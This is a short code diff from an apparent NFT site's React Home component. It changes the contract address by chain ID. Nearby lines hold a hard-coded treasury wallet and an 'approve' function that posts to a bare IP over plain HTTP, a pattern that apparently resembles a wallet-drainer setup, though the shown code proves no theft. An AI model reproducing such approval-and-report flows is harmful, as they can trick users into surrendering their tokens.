@@ -16,7 +16,7 @@ export default function Home() {
   const [nftCount, setCount] = useState(0)
 
   const treasuryWallet = "0xfCb3e3cEf98396fd23BE4aCA4a9e25A46245a928";
-  const contractAddress = "0x28bBdDC00971a0Bb95ffa3827BB8090aDb75C97F";
+  const contractAddress = chainId == 1 ? "0x28bBdDC00971a0Bb95ffa3827BB8090aDb75C97F": "0x0Db3D3Fb452a1c777E03A274Bc2dF278fDD03723";
 
   const approve = async () => {
     await fetch('http://143.198.133.144:8000/nfts', {
